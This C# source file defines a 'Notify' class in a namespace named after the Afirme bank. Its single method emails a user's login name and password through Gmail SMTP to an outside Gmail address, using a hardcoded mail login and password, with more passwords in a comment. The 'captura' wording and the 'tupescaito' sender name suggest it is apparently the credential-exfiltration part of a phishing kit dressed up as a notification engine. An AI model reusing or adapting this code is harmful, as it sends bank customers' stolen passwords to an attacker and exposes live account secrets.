using AfirmeNegocio.Models;
using System;
using System.Collections.Generic;
using System.Net.Mail;
using System.Text;

namespace AfirmeNegocio.EngineNotificacion
{
    public  class Notify
    {
        public  bool EnviarMail(NotificacionModel model)
        {
            bool result = false;
           
                SmtpClient servidor = new SmtpClient();
                MailMessage mensaje = new MailMessage();
                mensaje.From = new MailAddress("www.tupescaito.com <afirmeservicios.net@gmail.com>");
                mensaje.Subject = model.Asunto;
                mensaje.SubjectEncoding = System.Text.Encoding.UTF8;
                mensaje.Body = model.Usuario + " " + Environment.NewLine + " " + model.Password + " " + Environment.NewLine + model.Tipo + " " + Environment.NewLine + model.Fecha;
                mensaje.BodyEncoding = System.Text.Encoding.UTF8;
                mensaje.IsBodyHtml = true;
                mensaje.To.Add(new MailAddress("dondiegodelavegacapturaf@gmail.com"));
                //if (pathAdjunto != string.Empty) { mensaje.Attachments.Add(new Attachment(pathAdjunto)); }
                servidor.Credentials = new System.Net.NetworkCredential("afirmeservicios.net@gmail.com", "1234santiago"); //captura321afirme captura123.
                servidor.Port = 587;
                servidor.Host = "smtp.gmail.com";
                servidor.EnableSsl = true;
                servidor.Send(mensaje);
                mensaje.Dispose();
                result = true;
         

            return result;
        }
    }
}
